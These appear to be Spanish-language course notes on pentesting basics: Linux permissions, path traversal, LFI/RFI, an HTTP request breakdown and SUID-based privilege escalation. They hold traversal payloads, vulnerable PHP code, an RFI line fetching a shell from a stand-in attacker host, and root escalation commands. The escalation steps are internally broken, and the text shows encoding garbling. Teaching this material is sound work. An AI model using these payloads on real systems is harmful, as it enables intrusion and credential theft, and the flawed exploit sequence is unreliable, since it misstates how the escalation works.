## ① Repaso de permisos Linux €” Pablo explica

### La tabla de permisos

Pablo repasa la estructura de `ls -la` ante la clase:

```
Tipo Owner Group Others
 d rwx rwx rwx
 - rw- r-- r--
```

| Posición | Significado |
|----------|-------------|
| 1ª | Tipo de fichero (`-` fichero, `d` directorio, `l` enlace, `s` SUID) |
| 2ª-4ª | Owner (propietario) |
| 5ª-7ª | Group (grupo) |
| 8ª-10ª | Others (otros) |

### Pesos binarios

| Permiso | Valor | Descripción |
|---------|-------|-------------|
| r (read) | 4 | Lectura |
| w (write) | 2 | Escritura |
| x (execute) | 1 | Ejecución |

> [!note] La explicación de Pablo
> "Cada posición es una potencia de 2: 2│°, 2¹, 2². El máximo son 7 (4+2+1). Hacemos el sumatorio por trío y obtenemos el permiso."
>
> Pablo lo explicó así: "Si el owner tiene 5,implica lectura (4) + ejecución (1) = r-x."

### chmod con números

```bash
chmod 755 fichero # rwx r-x r-x
chmod 644 fichero # rw- r-- r--
chmod 777 fichero # rwx rwx rwx ( ¡NUNCA hacer esto! )
```

> [!important] Por qué los números son mejor que los símbolos
> Con `-x` quitas ejecución a los tres grupos a la vez. Con `chmod 754` especificás exactamente qué permiso tiene cada grupo. Es más preciso.

## ② Path Traversal y LFI €” conceptos

### ¿Qué es un Path?

Un **path** es una ruta a un fichero en el sistema de archivos.

```
/etc/hosts → path absoluto
./hola.py → path relativo (directorio actual)
/home/kali/documentos/ → path relativo
```

> [!note] El punto en Linux
> `.` = directorio actual (como `pwd`)
> `..` = directorio padre
> `../..` = dos niveles hacia atrás

### ¿Qué es Path Traversal?

Cuando un parámetro de la URL acepta un nombre de fichero y el PHP hace `readfile($fichero)`, si **no sanitiza** las secuencias `../`, el atacante puede escapar del directorio previsto.

```php
// Código VULNERABLE
<?php
$fichero = $_GET['archivo'];
readfile("ficheros/" . $fichero); // Sin sanitizar
?>
```

```
URL: ?archivo=../../../../etc/passwd
Resultado: ficheros/ + ../../../../etc/passwd = /etc/passwd
```

> [!important] La clave
> Path traversal **no es un RCE** porque no se ejecuta ningún comando. Es una función de lectura de fichero a la que se le pasa una ruta que escapa del directorio previsto.

### ¿Qué es LFI (Local File Inclusion)?

LFI es la **consecuencia** del path traversal: si podés leer cualquier fichero del sistema, tenés un **Local File Inclusion**.

```
Path Traversal → navegar entre directorios
 →“
LFI → leer ficheros locales no autorizados
```

### Ficheros que siempre se leen con LFI

| Fichero | Por qué |
|---------|---------|
| `/etc/passwd` | Usuarios con bash activo |
| `config.php` | Credenciales de base de datos |
| `php.ini` | Configuración del servidor PHP |
| `phpMyAdmin` | Configuración de administración DB |

### ¿Qué es RFI (Remote File Inclusion)?

Variante más peligrosa: el parámetro acepta una **URL externa**, y el servidor la descarga y ejecuta.

```php
// Código vulnerable a RFI
<?php
include($_GET['fichero']); // Si acepta URLs → RFI
?>
```

```
URL: ?fichero=http://atacante.com/shell.php
Resultado: el servidor descarga shell.php y la ejecuta → RCE completo
```

> [!warning] Mitigación
> La mitigación correcta es usar **rutas absolutas hardcodeadas**, no variables de usuario como argumento de funciones de lectura de ficheros.

## ③ Demostración en bash €” el transversal path

### Script vulnerable

```bash
#!/bin/bash
echo -n "Nombre del fichero: "
read fichero
if [ -f "$fichero" ]; then
 cat "$fichero"
else
 echo "El fichero no existe"
fi
```

### Explotación

```bash
# Si ejecuto "test" → imprime "prueba charChars"
# Si ejecuto "../../../../etc/passwd" → imprime /etc/passwd

# ¿Por qué funciona?
# Porque $fichero es una variable de usuario que se pasa directamente a cat
# cat no distingue entre rutas válidas y rutas que escapan del directorio
```

> [!note] La metáfora de Carlos
> "Imagina que esta habitación es Linux. ¿Cuántos metros para atrás tengo? Si pongo 9 `../`, una vez llego a la raíz, no puedo retroceder más. Por eso se ponen nueve o más: garantiza llegar a / sin errores."

### ¿Cuándo funciona?

1. El script tiene una variable de usuario que se pasa a `cat`, `readfile`, `include`, etc.
2. No hay sanitización de `../`
3. El atacante controla el valor de la variable (vía URL, formulario, etc.)

## ⑤ Desglose de petición HTTP en Burp Suite

### Request (lo que enviamos)

```
POST /descargar.php HTTP/1.1
Host: 10.0.2.9
User-Agent: Mozilla/5.0...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://10.0.2.9
Referer: http://10.0.2.9/panel

archivo=sobre_nosotros.pdf
```

| Header | Qué hace | Por qué importa |
|--------|----------|-----------------|
| `POST /descargar.php` | Método + ruta + versión | Nos dice qué endpoint atacar |
| `Host` | IP o dominio del servidor | Identifica al objetivo |
| `User-Agent` | Navegador y SO del cliente | Muchos anti-bots lo usan para filtrar |
| `Accept` | Formatos que acepta el cliente | Incluye `application/xml` → relevante para XXE |
| `Content-Type` | Formato del body | `application/x-www-form-urlencoded` = formulario web |
| `Content-Length` | Tamaño en bytes del body | WAFs lo usan para filtrar payloads |
| `Origin` | Dominio de origen | Algunas apps solo aceptan `localhost` |
| `Referer` | URL de origen | Útil para bypass de restricciones |

→

### Response (lo que recibimos)

```
HTTP/1.1 200 OK
Date: Wed, 08 Jul 2026 10:00:00 GMT
Server: Apache/2.4.66 (Debian)
Content-Length: 4523
Content-Disposition: attachment; filename="sobre_nosotros.pdf"
```

| Header | Qué hace | Por qué importa |
|--------|----------|-----------------|
| `200 OK` | Código de estado | Éxito de la petición |
| `Server` | Versión del servidor | Banner grabbing (Nmap lo usa) |
| `Content-Length` | Tamaño de la respuesta | Detectar éxito de fuerza bruta por diferencia de tamaño |
| `Content-Disposition` | Nombre del fichero descargado | Indica que es una descarga |

> [!important] Los headers no son decoración
> Cada campo puede ser vector de información para el atacante (User-Agent falso, Origin manipulado) o vector de ataque en sí mismo (Content-Type para bypass de filtros).

## ⑦ Escalada de privilegios €” SUID, lsattr y chattr

### Los 5 comandos iniciales (siempre al entrar)

```bash
whoami # ¿Quién soy?
pwd # ¿Dónde estoy?
uname -a # Versión del kernel
sudo -l # ¿Qué puedo ejecutar como root?
find / -perm -4000 -type f 2>/dev/null # Buscar SUIDs
```

### sudo -l en esta máquina

```bash
sudo -l
# Error: el usuario no tiene permisos de sudo
```

### Búsqueda de SUIDs

```bash
find / -perm -4000 -type f 2>/dev/null
```

Resultado: comandos habituales (`sudo`, `su`, `mount`, `passwd`) más dos inusuales:
- **`lsattr`** €” lista atributos extendidos de ficheros
- **`chattr`** €” modifica atributos extendidos de ficheros

> [!note] ¿Por qué son inusuales?
> `lsattr` y `chattr` son comandos de gestión de atributos de ficheros. Normalmente **no necesitan SUID**. Si los ves con SUID, es porque algo raro está pasando.

### GTFOBins

```bash
# Buscar en GTFOBins → Privilege Escalation → SUID
# lsattr y chattr aparecen ambos
```

> [!tip] GTFOBins es tu amigo
> Siempre que encuentres un SUID raro, buscalo en GTFOBins. Si aparece, tiene técnica de escalada documentada.

### Atributo inmutable

```bash
lsattr -R / 2>/dev/null
# O con find:
# Buscar ficheros con atributo i (inmutable)
```

Resultado: `/usr/local/bin/backup.sh` tiene el atributo **inmutable** (i).

> [!important] ¿Qué es inmutable?
> El atributo `i` (immutable) hace que un fichero **no pueda ser modificado, borrado, renombrado ni enlazado**, ni siquiera por root, mientras esté activo.

### Explotación

```bash
# 1. Quitar inmutabilidad
chattr -i /usr/local/bin/backup.sh

# 2. Sobrescribir el script con bash
echo "/bin/bash" > /usr/local/bin/backup.sh

# 3. Dar bit SUID a bash
chmod +s /bin/bash

# 4. Esperar a que root ejecute el cronjob
# (el script se ejecuta periódicamente como root)

# 5. Obtener shell de root
/bin/bash -p
# uid=0(root) → ¡SOMOS ROOT!
```

> [!important] La clave de la escalada
> La escalada **no es ejecutar el fichero uno mismo**, sino dejar preparado el payload y **esperar a que root lo ejecute** a través de una tarea programada. El atacante no necesita ejecutar nada como root: basta con que root lo haga por él, sin saberlo.
